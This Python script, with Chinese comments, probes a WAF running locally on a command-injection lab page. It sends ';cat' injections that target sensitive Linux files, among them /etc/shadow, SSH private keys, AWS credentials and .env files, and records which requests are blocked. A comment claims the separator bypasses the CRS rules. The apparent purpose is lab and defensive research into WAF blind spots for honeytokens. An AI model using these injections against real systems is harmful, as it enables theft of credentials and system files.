#!/usr/bin/env python3
"""WAF路径敏感度探测 — 用真实Linux路径词典测试CRS PL4的拦截行为"""
import sys,io,subprocess,json
from collections import defaultdict
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

# 真实Linux系统中攻击者会瞄准的路径词典
# 分类：系统敏感 / Web服务 / 应用配置 / 日志 / 凭证 / 无害
PATHS = {
    "系统文件": [
        "/etc/passwd", "/etc/shadow", "/etc/group", "/etc/hosts", "/etc/hostname",
        "/etc/motd", "/etc/issue", "/etc/fstab", "/etc/crontab", "/etc/resolv.conf",
        "/etc/sudoers", "/etc/ssh/sshd_config", "/etc/ssl/private/ssl-cert.key",
        "/proc/version", "/proc/self/environ", "/proc/self/cmdline",
        "/proc/self/maps", "/proc/cpuinfo", "/proc/meminfo",
        "/sys/class/net/eth0/address",
    ],
    "Web服务": [
        "/var/www/html/index.php", "/var/www/html/config.php",
        "/var/www/html/.env", "/var/www/html/wp-config.php",
        "/var/www/.env", "/var/www/.htaccess", "/var/www/.git/config",
        "/usr/share/nginx/html/index.html",
        "/opt/tomcat/conf/server.xml", "/opt/tomcat/webapps/ROOT/WEB-INF/web.xml",
    ],
    "应用配置": [
        "/home/user/.bashrc", "/home/user/.bash_history", "/home/user/.ssh/id_rsa",
        "/home/user/.ssh/authorized_keys", "/home/user/.aws/credentials",
        "/root/.bashrc", "/root/.ssh/id_rsa", "/root/.bash_history",
        "/opt/app/config.yml", "/opt/app/database.yml",
        "/srv/app/settings.py", "/srv/config/database.json",
        "/usr/local/etc/redis.conf", "/usr/local/etc/mysql/my.cnf",
    ],
    "日志": [
        "/var/log/syslog", "/var/log/auth.log", "/var/log/apache2/access.log",
        "/var/log/apache2/error.log", "/var/log/mysql/error.log",
        "/var/log/nginx/access.log", "/var/log/nginx/error.log",
        "/tmp/session.key", "/tmp/mysql.sock",
    ],
    "凭证": [
        "/.env", "/config/.env", "/app/.env", ".env",
        "id_rsa", "id_ed25519", "authorized_keys",
        ".git/config", ".svn/entries", ".DS_Store",
        "wp-config.php", "settings.py", "database.yml",
    ],
    "无害": [
        "/tmp/test.txt", "/dev/null", "/home/user/notes",
        "/usr/share/doc/README", "/opt/test/hello",
    ],
}

BASE_URL = "http://localhost:8090"
SEPARATOR = ";cat"  # 已验证绕过CRS语法的分隔符

def probe(path):
    """用干净分隔符测试单个路径是否被WAF拦截"""
    url = f"{BASE_URL}/cmdi/level1.php"
    # URL编码分号和cat，空格用%20
    cmd = f"{SEPARATOR} {path}"
    import urllib.parse
    encoded = urllib.parse.quote(cmd, safe='')
    try:
        result = subprocess.run(
            ['curl', '-s', '-o', '/dev/null', '-w', '%{http_code}',
             '--max-time', '5', f'{url}?cmd={encoded}'],
            capture_output=True, text=True, timeout=10
        )
        code = result.stdout.strip()
        return int(code) if code.isdigit() else 0
    except:
        return 0

def main():
    print("=" * 80)
    print("  WAF 路径敏感度探测 — 真实Linux路径词典")
    print(f"  分隔符: {SEPARATOR} (已验证绕过CRS语法)")
    print("=" * 80)
    print()

    results = defaultdict(list)
    all_results = []

    for category, paths in PATHS.items():
        print(f"  [{category}]")
        for path in paths:
            code = probe(path)
            icon = "🛡️" if code == 403 else ("✅" if code == 200 else f"[{code}]")
            blocked = "BLOCKED" if code == 403 else "passed"
            print(f"    {icon} {code} {path}")
            results[category].append({"path": path, "code": code, "blocked": code == 403})
            all_results.append({"category": category, "path": path, "code": code, "blocked": code == 403})
        print()

    # 汇总
    print("=" * 80)
    print("  汇总")
    print("=" * 80)
    for category in PATHS:
        items = results[category]
        blocked_n = sum(1 for i in items if i["blocked"])
        total = len(items)
        pct = round(blocked_n / total * 100) if total > 0 else 0
        bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
        print(f"  {category:<10s}: {blocked_n:2d}/{total:2d} 拦截 ({pct:3d}%) {bar}")

    print()
    print("  💡 WAF拦住=真敏感 / WAF放行=盲区(可嵌入蜜标)")

    # 保存结果
    with open("logs/path_probe_results.json", "w") as f:
        json.dump(all_results, f, indent=2)
    print(f"\n  📁 详细结果: logs/path_probe_results.json")

if __name__ == "__main__":
    main()
